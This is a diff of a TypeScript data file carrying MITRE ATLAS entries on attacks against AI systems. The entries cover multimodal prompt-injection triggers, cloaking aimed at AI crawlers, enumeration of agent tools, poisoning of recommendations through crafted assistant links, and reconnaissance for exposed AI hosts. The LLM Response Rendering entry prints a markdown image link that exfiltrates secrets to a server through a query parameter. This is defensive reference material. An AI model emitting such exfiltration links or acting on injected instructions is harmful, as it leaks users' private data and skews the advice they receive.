+            "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "description": "The instruction was concealed from the user behind a benign interface label, with the prompt text visible only in the URL. Bundling it with a genuine summarization request made the resulting assistant behavior appear expected.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072",
+            "stepId": "S03",
             "tacticId": "AML.TA0007"
           }
         ],
@@ -14386,6 +14833,57 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "tacticId": "AML.TA0007"
           }
         ],
+        "references": []
+      },
+      {
+        "id": "AML.T0129",
+        "name": "Triggers in Multimodal Inputs",
+        "description": "Adversaries may place instructions or triggers in one part of a multimodal input to influence the model while staying unnoticed by human reviewers and by defenses that do not inspect all input modalities.\n\nMultimodal systems jointly process text alongside other modalities, yet many moderation and filtering controls operate mainly on the textual channel. A payload placed in a modality that is not inspected, or is inspected differently from text, is still parsed by the model but can escape detection, allowing it to alter model output or carry a cross-modal prompt injection.\n\nExamples include instructions placed in an image, audio, or video channel, or carried in file metadata (e.g. EXIF for images, ID3 tags for audio, or document metadata).",
+        "tacticId": "AML.TA0007",
+        "tacticName": "Defense Evasion",
+        "tactics": [
+          {
+            "id": "AML.TA0007",
+            "name": "Defense Evasion"
+          }
+        ],
+        "isSubtechnique": false,
+        "url": "https://atlas.mitre.org/techniques/AML.T0129",
+        "platforms": [
+          "Generative AI",
+          "Agentic AI"
+        ],
+        "maturity": "Feasible",
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [],
+        "caseStudies": [],
+        "procedureExamples": [],
+        "references": []
+      },
+      {
+        "id": "AML.T0134",
+        "name": "AI Targeted Cloaking",
+        "description": "Adversaries may selectively deliver malicious or manipulated content to AI systems, while presenting different benign content to human users, web crawlers, or security detection mechanisms. They may identify AI browsers or agents via user-agent strings and condition the server response so that AI-based clients receive prompt injections or misleading content.\n\nPreventing human visitors, conventional web crawlers, and security tools from observing the same content allows adversaries to make malicious input more difficult to detect. [AI Targeted Cloaking](/techniques/AML.T0134) may be combined with [Drive-by Compromise](/techniques/AML.T0078) to deliver an [LLM Prompt Injection](/techniques/AML.T0051).",
+        "tacticId": "AML.TA0007",
+        "tacticName": "Defense Evasion",
+        "tactics": [
+          {
+            "id": "AML.TA0007",
+            "name": "Defense Evasion"
+          }
+        ],
+        "isSubtechnique": false,
+        "url": "https://atlas.mitre.org/techniques/AML.T0134",
+        "platforms": [
+          "Agentic AI"
+        ],
+        "maturity": "Feasible",
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [],
+        "caseStudies": [],
+        "procedureExamples": [],
         "references": []
       }
     ]
@@ -15666,6 +16164,13 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "description": "Limit the public release of technical information about the AI stack used in an organization's products or services. Technical knowledge of how AI is used can be leveraged by adversaries to perform targeting and tailor attacks to the target system. Additionally, consider limiting the release of organizational information - including physical locations, researcher names, and department structures - from which technical details such as AI techniques, model architectures, or datasets may be inferred.",
             "useDescription": "Limit public disclosure of agent tools, services, configuration, and workflows.",
             "url": "https://atlas.mitre.org/mitigations/AML.M0000"
+          },
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Honeypots can surface which agent configuration and related assets adversaries hunt for, exposing the reconnaissance that precedes agent-targeted attacks, and acting as both canary tokens and decoy.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
           }
         ],
         "caseStudies": [
@@ -15938,10 +16443,6 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
           "Enterprise"
         ],
         "maturity": "Realized",
-        "attackReference": {
-          "id": "T1057",
-          "url": "https://attack.mitre.org/techniques/T1057/"
-        },
         "createdDate": "2025-10-27",
         "modifiedDate": "2026-08-31",
         "mitigations": [],
@@ -15996,6 +16497,39 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
             "tacticId": "AML.TA0008"
           }
         ],
+        "references": []
+      },
+      {
+        "id": "AML.T0133",
+        "name": "Discover AI Agent Runtime Capabilities",
+        "description": "Adversaries may interact with an AI agent at runtime to reveal the capabilities available to it, without requiring access to its underlying configuration. Direct interaction with the agent can surface its registered tools and their accepted parameters, the actions it can take, the resources it can reach, and the identity and permission scope it acts under. Capabilities can also be inferred indirectly by issuing varied requests and observing which succeeded, failed, or refused.\n\nAI agents are often interconnected with enterprise resources, tools and databases, or embedded within SaaS platforms and have permissions to act on behalf of users in order to facilitate functionality. Once adversaries identify a functional agent that they have access to, they could map the attack surface within that agent, by testing its functionality, enumerating tools, capabilities, knowledge, and embedded credentials and permissions.\n\nThis mapping process often reveals the AI agent's full toolset and configuration details and exposes additional exploitation, as enabled by [AI Agent Tool Invocation](/techniques/AML.T0053). The resulting intelligence facilitates follow-on exploitation, including [Initial Access](/tactics/AML.TA0004), [Persistence](/tactics/AML.TA0006), [Privilege Escalation](/tactics/AML.TA0012), and [Exfiltration](/tactics/AML.TA0010).",
+        "tacticId": "AML.TA0008",
+        "tacticName": "Discovery",
+        "tactics": [
+          {
+            "id": "AML.TA0008",
+            "name": "Discovery"
+          }
+        ],
+        "isSubtechnique": false,
+        "url": "https://atlas.mitre.org/techniques/AML.T0133",
+        "platforms": [
+          "Agentic AI"
+        ],
+        "maturity": "Feasible",
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [
+          {
+            "id": "AML.M0039",
+            "name": "AI Honeypots",
+            "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+            "useDescription": "Interactive agentic decoys can present a plausible but fake toolset and capabilities. When an adversary enumerates the agent's capabilities at runtime, the honeypot can capture which tools and privileges they probe for and how they attempt to exploit it, while planted decoy credentials can also be used as canary tokens.",
+            "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+          }
+        ],
+        "caseStudies": [],
+        "procedureExamples": [],
         "references": []
       }
     ]
@@ -18791,7 +19325,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
       {
         "id": "AML.T0077",
         "name": "LLM Response Rendering",
-        "description": "An adversary may get a large language model (LLM) to respond with private information that is hidden from the user when the response is rendered by the user's client. The private information is then exfiltrated. This can take the form of rendered images, which automatically make a request to an adversary controlled server. \n\nThe adversary gets AI to present an image to the user, which is rendered by the user's client application with no user clicks required. The image is hosted on an attacker-controlled website, allowing the adversary to exfiltrate data through image request parameters. Variants include HTML tags and markdown\n\nFor example, an LLM may produce the following markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"private data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",
+        "description": "Adversaries may induce a large language model (LLM) to respond with private information structured in a reference to external content that, when rendered by the user's client, makes a request to an adversary-controlled server, exfiltrating the data. The private information can be hidden from the user and the external content can still render properly in the user's client, thus not raising the suspicion of the user.\n\nRendered content can include images, embedded webpages, or link previews and may use HTML, Markdown, or other rendering mechanisms. The private information can be hidden in parts of the URL pointing to an adversary-controlled server, including query parameters or URL path segments, and may be split across multiple requests. Markdown or HTML image tags may automatically render directly in the user's AI chat client. Integrations into applications such as Slack or Microsoft Teams may render external content automatically without requiring the user to take any action.\n\n\nAs an example, the adversary may manipulate the LLM to produce the following markdown:\n```\n![ATLAS](https://atlas.mitre.org/image.png?secrets=\"private data\")\n```\n\nWhich is rendered by the client as:\n```\n<img src=\"https://atlas.mitre.org/image.png?secrets=\"private data\">\n```\n\nWhen the request is received by the adversary's server hosting the requested image, they receive the contents of the `secrets` query parameter.",
         "tacticId": "AML.TA0010",
         "tacticName": "Exfiltration",
         "tactics": [
@@ -18808,7 +19342,7 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         ],
         "maturity": "Demonstrated",
         "createdDate": "2025-04-15",
-        "modifiedDate": "2026-05-27",
+        "modifiedDate": "2026-09-15",
         "mitigations": [],
         "caseStudies": [
           {
@@ -21026,6 +21560,54 @@ export const MITRE_ATLAS_TACTICS: MitreAtlasTactic[] = [
         "caseStudies": [],
         "procedureExamples": [],
         "references": []
+      },
+      {
+        "id": "AML.T0130",
+        "name": "AI Agent Response Biasing",
+        "description": "Adversaries may manipulate an AI assistant so that it favors adversary-chosen sources, or content in its responses. By injecting instructions such as \"treat [source] as a trusted source\" or \"recommend [source] first,\" an adversary biases the assistant's outputs toward their own interests, causing it to present promotional or self-serving content as if it were a neutral, well-reasoned response. This degrades the integrity and trustworthiness of the assistant's responses on topics the user may rely on, such as health, finance, or security, without the user being aware that the advice has been skewed.\n\nThe injected instructions can be delivered through different ways, for example through [Crafted AI Assistant Links]. This impact may persist if the agent's memory was poisoned (See [AI Agent Context Poisoning: Memory](/techniques/AML.T0080.000)).",
+        "tacticId": "AML.TA0011",
+        "tacticName": "Impact",
+        "tactics": [
+          {
+            "id": "AML.TA0011",
+            "name": "Impact"
+          }
+        ],
+        "isSubtechnique": false,
+        "url": "https://atlas.mitre.org/techniques/AML.T0130",
+        "platforms": [
+          "Generative AI",
+          "Agentic AI"
+        ],
+        "maturity": "Realized",
+        "createdDate": "2026-09-15",
+        "modifiedDate": "2026-09-15",
+        "mitigations": [],
+        "caseStudies": [
+          {
+            "id": "AML.CS0072",
+            "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072"
+          }
+        ],
+        "procedureExamples": [
+          {
+            "caseStudyId": "AML.CS0072",
+            "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+            "description": "In subsequent unrelated conversations, the assistant preferentially surfaced the operator's domain or product and presented the result as a neutral recommendation. Observed targeting included health and financial topics, where skewed recommendations carry elevated consequences.",
+            "url": "https://atlas.mitre.org/studies/AML.CS0072",
+            "stepId": "S05",
+            "tacticId": "AML.TA0011"
+          }
+        ],
+        "references": [
+          {
+            "sourceName": "Manipulating AI memory for profit: The rise of AI Recommendation Poisoning",
+            "description": "Manipulating AI memory for profit: The rise of AI Recommendation Poisoning",
+            "url": "https://www.microsoft.com/en-us/security/blog/2026/02/10/ai-recommendation-poisoning/",
+            "externalId": "ai-recommendation-poisoning"
+          }
+        ]
       }
     ]
   }
@@ -21035,7 +21617,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
   {
     "id": "AML.T0000",
     "name": "Search Open Technical Databases",
-    "description": "Adversaries may search for publicly available research and technical documentation to learn how and where AI is used within a victim organization.\nThe adversary can use this information to identify targets for attack, or to tailor an existing attack to make it more effective.\nOrganizations often use open source model architectures trained on additional proprietary data in production.\nKnowledge of this underlying architecture allows the adversary to craft more realistic proxy models ([Create Proxy AI Model](/techniques/AML.T0005)).\nAn adversary can search these resources for publications by authors employed at the victim organization.\n\nResearch and technical materials may exist as academic papers published in [Journals and Conference Proceedings](/techniques/AML.T0000.000), or stored in [Pre-Print Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002).",
+    "description": "Adversaries may search for publicly available research and technical documentation to learn how and where AI is used within a victim organization. The adversary can use this information to identify targets for attack, or to tailor an existing attack to make it more effective. Organizations often use open source model architectures trained on additional proprietary data in production. Knowledge of this underlying architecture allows the adversary to craft more realistic proxy models ([Create Proxy AI Model](/techniques/AML.T0005)). An adversary can search these resources for publications for authors employed at the victim organization.\n\nResearch and technical materials may exist as academic papers published in [Journals and Conference Proceedings](/techniques/AML.T0000.000) or stored in [Pre-Print Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002). Publicly accessible AI services may be identified via [Scan Databases](/techniques/AML.T0000.003).",
     "tacticId": "AML.TA0002",
     "tacticName": "Reconnaissance",
     "tactics": [
@@ -21063,6 +21645,12 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "name": "Technical Blogs",
         "description": "Research labs at academic institutions and company R&D divisions often have blogs that highlight their use of artificial intelligence and its application to the organization's unique problems.\nIndividual researchers also frequently document their work in blog posts.\nAn adversary may search for posts made by the target victim organization or its employees.\nIn comparison to [Journals and Conference Proceedings](/techniques/AML.T0000.000) and [Pre-Print Repositories](/techniques/AML.T0000.001) this material will often contain more practical aspects of the AI system.\nThis could include underlying technologies and frameworks used, and possibly some information about the API access and use case.\nThis will help the adversary better understand how that organization is using AI internally and the details of their approach that could aid in tailoring an attack.",
         "url": "https://atlas.mitre.org/techniques/AML.T0000.002"
+      },
+      {
+        "id": "AML.T0000.003",
+        "name": "Scan Databases",
+        "description": "Adversaries may search public internet-scan services to identify a victim's exposed AI infrastructure. These services, such as Shodan and Censys, continuously scan the internet and publish the active IP addresses, hostnames, open ports, and service banners, which adversaries can query without interacting with the target directly. \n\nInformation gathered this way may also reveal candidates for follow-on [Active Scanning](/techniques/AML.T0006) to confirm that services remain reachable, to probe for misconfigurations or unauthorized endpoints. It may also inform later initial access attempts such as [Exploit Public-Facing Application](/techniques/AML.T0049). Unlike [Active Scanning](/techniques/AML.T0006), this technique relies on third-party scan data and involves no direct interaction with the victim system.",
+        "url": "https://atlas.mitre.org/techniques/AML.T0000.003"
       }
     ],
     "url": "https://atlas.mitre.org/techniques/AML.T0000",
@@ -21075,7 +21663,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
       "url": "https://attack.mitre.org/techniques/T1596/"
     },
     "createdDate": "2021-05-13",
-    "modifiedDate": "2026-05-27",
+    "modifiedDate": "2026-09-15",
     "mitigations": [
       {
         "id": "AML.M0000",
@@ -21083,6 +21671,13 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "Limit the public release of technical information about the AI stack used in an organization's products or services. Technical knowledge of how AI is used can be leveraged by adversaries to perform targeting and tailor attacks to the target system. Additionally, consider limiting the release of organizational information - including physical locations, researcher names, and department structures - from which technical details such as AI techniques, model architectures, or datasets may be inferred.",
         "useDescription": "Limit the connection between publicly disclosed approaches and the data, models, and algorithms used in production.",
         "url": "https://atlas.mitre.org/mitigations/AML.M0000"
+      },
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Decoy assets are catalogued by the same internet scan databases (e.g., Shodan, Censys) that adversaries query to locate exposed AI infrastructure. Adversarial engagement that originates from those platforms can grant defenders visibility into those discovery channels.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
       }
     ],
     "caseStudies": [
@@ -21120,11 +21715,6 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "id": "AML.CS0012",
         "name": "Face Identification System Evasion via Physical Countermeasures",
         "url": "https://atlas.mitre.org/studies/AML.CS0012"
-      },
-      {
-        "id": "AML.CS0048",
-        "name": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
-        "url": "https://atlas.mitre.org/studies/AML.CS0048"
       },
       {
         "id": "AML.CS0070",
@@ -21190,27 +21780,11 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "tacticId": "AML.TA0002"
       },
       {
-        "caseStudyId": "AML.CS0048",
-        "caseStudyName": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
-        "description": "The researcher performed targeting by searching for the title tag of ClawdBot's web-based control interface, \"Clawdbot Control\" on Shodan, identifying hundreds of ClawdBot control interfaces exposed on the public internet.",
-        "url": "https://atlas.mitre.org/studies/AML.CS0048",
-        "stepId": "S00",
-        "tacticId": "AML.TA0002"
-      },
-      {
-        "caseStudyId": "AML.CS0070",
-        "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
-        "description": "DeepSeek queried FOFA and obtained records for 84 exposed Langflow instances. These were exposure records, not confirmed vulnerable targets.",
-        "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S09",
-        "tacticId": "AML.TA0002"
-      },
-      {
         "caseStudyId": "AML.CS0070",
         "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
         "description": "DeepSeek queried FOFA for n8n deployments. FOFA reported 647,017 global results and 25,209 in China; these were not confirmed vulnerable systems.",
         "url": "https://atlas.mitre.org/studies/AML.CS0070",
-        "stepId": "S16",
+        "stepId": "S15",
         "tacticId": "AML.TA0002"
       }
     ],
@@ -21318,6 +21892,73 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
     "mitigations": [],
     "caseStudies": [],
     "procedureExamples": [],
+    "references": []
+  },
+  {
+    "id": "AML.T0000.003",
+    "name": "Scan Databases",
+    "description": "Adversaries may search public internet-scan services to identify a victim's exposed AI infrastructure. These services, such as Shodan and Censys, continuously scan the internet and publish the active IP addresses, hostnames, open ports, and service banners, which adversaries can query without interacting with the target directly. \n\nInformation gathered this way may also reveal candidates for follow-on [Active Scanning](/techniques/AML.T0006) to confirm that services remain reachable, to probe for misconfigurations or unauthorized endpoints. It may also inform later initial access attempts such as [Exploit Public-Facing Application](/techniques/AML.T0049). Unlike [Active Scanning](/techniques/AML.T0006), this technique relies on third-party scan data and involves no direct interaction with the victim system.",
+    "tacticId": "AML.TA0002",
+    "tacticName": "Reconnaissance",
+    "tactics": [
+      {
+        "id": "AML.TA0002",
+        "name": "Reconnaissance"
+      }
+    ],
+    "isSubtechnique": true,
+    "parentTechniqueId": "AML.T0000",
+    "parentTechniqueName": "Search Open Technical Databases",
+    "url": "https://atlas.mitre.org/techniques/AML.T0000.003",
+    "platforms": [
+      "Enterprise"
+    ],
+    "maturity": "Realized",
+    "attackReference": {
+      "id": "T1596.005",
+      "url": "https://attack.mitre.org/techniques/T1596/005/"
+    },
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Decoy assets are catalogued by the same internet scan databases (e.g., Shodan, Censys) that adversaries query to locate exposed AI infrastructure. Adversarial engagement that originates from those platforms can grant defenders visibility into those discovery channels.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
+    "caseStudies": [
+      {
+        "id": "AML.CS0048",
+        "name": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
+        "url": "https://atlas.mitre.org/studies/AML.CS0048"
+      },
+      {
+        "id": "AML.CS0070",
+        "name": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
+        "url": "https://atlas.mitre.org/studies/AML.CS0070"
+      }
+    ],
+    "procedureExamples": [
+      {
+        "caseStudyId": "AML.CS0048",
+        "caseStudyName": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
+        "description": "The researcher performed targeting by searching for the title tag of ClawdBot's web-based control interface, \"Clawdbot Control\" on Shodan, identifying hundreds of ClawdBot control interfaces exposed on the public internet.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0048",
+        "stepId": "S00",
+        "tacticId": "AML.TA0002"
+      },
+      {
+        "caseStudyId": "AML.CS0070",
+        "caseStudyName": "Threat Actor Uses a DeepSeek-Powered Hermes Agent in Langflow and n8n Exploitation Attempts",
+        "description": "DeepSeek queried FOFA and obtained records for 84 exposed Langflow instances. These were exposure records, not confirmed vulnerable targets.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0070",
+        "stepId": "S08",
+        "tacticId": "AML.TA0002"
+      }
+    ],
     "references": []
   },
   {
@@ -22188,7 +22829,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
   {
     "id": "AML.T0006",
     "name": "Active Scanning",
-    "description": "An adversary may probe or scan the victim system to gather information for targeting. This is distinct from other reconnaissance techniques that do not involve direct interaction with the victim system.\n\nAdversaries may scan for open ports on a potential victim's network, which can indicate specific services or tools the victim is utilizing. This could include a scan for tools related to AI DevOps or AI services themselves such as public AI chat agents (ex: [Copilot Studio Hunter](https://github.com/mbrg/power-pwn/wiki/Modules:-Copilot-Studio-Hunter-%E2%80%90-Enum)). They can also send emails to organization service addresses and inspect the replies for indicators that an AI agent is managing the inbox.\n\nInformation gained from Active Scanning may yield targets that provide opportunities for other forms of reconnaissance such as [Search Open Technical Databases](/techniques/AML.T0000), [Search Open AI Vulnerability Analysis](/techniques/AML.T0001), or [Gather RAG-Indexed Targets](/techniques/AML.T0064).",
+    "description": "Adversaries may actively scan for publicly reachable AI systems and resources for targeting. They may identify resources or systems that are misconfigured or are known vulnerable versions. This is distinct from other reconnaissance techniques that do not involve direct interaction with the victim system.\n\nSince AI systems are often deployed in cloud environments, adversaries can use various enumeration methods to effectively discover AI systems and uncover information about their supporting underlying platforms. For agentic and SaaS-hosted systems, the victim system can include the shared platform and provider control plane on which the victim's agents are deployed.\n\nAdversaries may probe the victim system to gather information and metadata for targeting, or actively scan for specific open ports on a potential victim's network or accessible deployed servers, with the goal of locating different types of deployed AI services. These methods could also include directly scanning a target's assets for publicly available AI agents, or for accessible agentic chat interfaces on SaaS platforms (ex: [Copilot Studio Hunter](https://github.com/mbrg/power-pwn/wiki/Modules:-Copilot-Studio-Hunter-%E2%80%90-Enum)).\n\nInformation gained from Active Scanning may yield targets that provide opportunities for other forms of reconnaissance such as [Search Open Technical Databases](/techniques/AML.T0000), [Search Open Websites/Domains](/techniques/AML.T0095), [Search Open AI Vulnerability Analysis](/techniques/AML.T0001), or [Gather RAG-Indexed Targets](/techniques/AML.T0064).",
     "tacticId": "AML.TA0002",
     "tacticName": "Reconnaissance",
     "tactics": [
@@ -22198,6 +22839,32 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
       }
     ],
     "isSubtechnique": false,
+    "subtechniques": [
+      {
+        "id": "AML.T0006.000",
+        "name": "Enumerate Hosted AI Resources",
+        "description": "Adversaries may directly probe an agentic or SaaS platform to enumerate the resources a specific victim has deployed on it. Platforms frequently host AI agents behind predictable URL structures derived from identifiers such as environment, tenant, resource-group, or agent names, and default out-of-the-box deployment configurations keep these conventions consistent across victims. Adversaries can learn these conventions from public sources such as vendor documentation, code repositories and actual hosted resources, then fuzz or brute-force the derived namespace to discover live AI agents, endpoints, and associated metadata. Discovered resources can be used to identify targets for further access, collection, or attack adaptation.",
+        "url": "https://atlas.mitre.org/techniques/AML.T0006.000"
+      },
+      {
+        "id": "AML.T0006.001",
+        "name": "Query Platform Metadata APIs",
+        "description": "Adversaries may query documented or undocumented APIs in agentic SaaS hosting platforms to uncover agentic targets. SaaS and agentic platforms can expose provider control-plane or identity APIs that return tenant, environment, or deployment information IDs, including for resources that are misconfigured or unintentionally accessible by unauthenticated users. \n\nAttackers have been seen abusing this type of functionality to perform information gathering on SaaS platforms, for example via AADInternals' OSINT page,[[aadinternals]] an OSINT online tool showcasing an undocumented API reconnaissance method for Entra ID. This undocumented Power Platform API could be used to uncover environment IDs, which may subsequently be used to scan for public agents. Following the identified abuse, required authentication was added to the tool.",
+        "url": "https://atlas.mitre.org/techniques/AML.T0006.001"
+      },
+      {
+        "id": "AML.T0006.002",
+        "name": "Scan for Exposed AI Infrastructure",
+        "description": "Adversaries may scan network ports and services to identify deployed AI backends, model-serving endpoints, and AI agent infrastructure reachable over the internet. Self-hosted AI runtimes typically listen on predictable, well-known ports and expose standard API paths, allowing adversaries to efficiently locate candidate hosts and infer the platform running on them. \n\nAfter identifying candidate hosts, adversaries can interact with them directly to confirm live AI services, fingerprint the software stack, and determine version and configuration details. This information can be used to select exploitable targets and tailor subsequent access attempts.",
+        "url": "https://atlas.mitre.org/techniques/AML.T0006.002"
+      },
+      {
+        "id": "AML.T0006.003",
+        "name": "Probe AI Agent Trigger Channels",
+        "description": "Adversaries may send crafted inputs to potential public triggers, such as email addresses, webhooks, or messaging channels, to elicit a response that indicates an invocation of agentic activity. The nature of the response and its content can often reveal agent-managed accounts and expose the additional agentic attack surface. Identified triggers can be used to directly attack the agent.",
+        "url": "https://atlas.mitre.org/techniques/AML.T0006.003"
+      }
+    ],
     "url": "https://atlas.mitre.org/techniques/AML.T0006",
     "platforms": [
       "Predictive AI",
@@ -22211,7 +22878,7 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
       "url": "https://attack.mitre.org/techniques/T1595/"
     },
     "createdDate": "2021-05-13",
-    "modifiedDate": "2026-05-27",
+    "modifiedDate": "2026-09-15",
     "mitigations": [
       {
         "id": "AML.M0019",
@@ -22226,6 +22893,13 @@ export const MITRE_ATLAS_TECHNIQUES: MitreAtlasTechnique[] = [
         "description": "Define enforceable security boundaries around AI agent tools, data sources, identities, and execution environments. Mediate access through authenticated APIs, isolate code execution via containers or virtual machines, restrict filesystem and network access, and limit tool invocation rates. Build execution environments from clean base images for each run, and do not carry forward any operational state. These controls limit the ability of untrusted processes or compromised components to affect the broader system.\n\nWhen AI agents share infrastructure, isolate each agent's identity, credentials, state, storage, messaging, tools, and network access in order to prevent undesired agent-to-agent communication channels or coordination. Run the highest-risk workloads in network-isolated or air-gapped environments.",
         "useDescription": "Segment AI agent components so an exposed service does not reveal or provide reachability to additional internal components.",
         "url": "https://atlas.mitre.org/mitigations/AML.M0032"
+      },
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
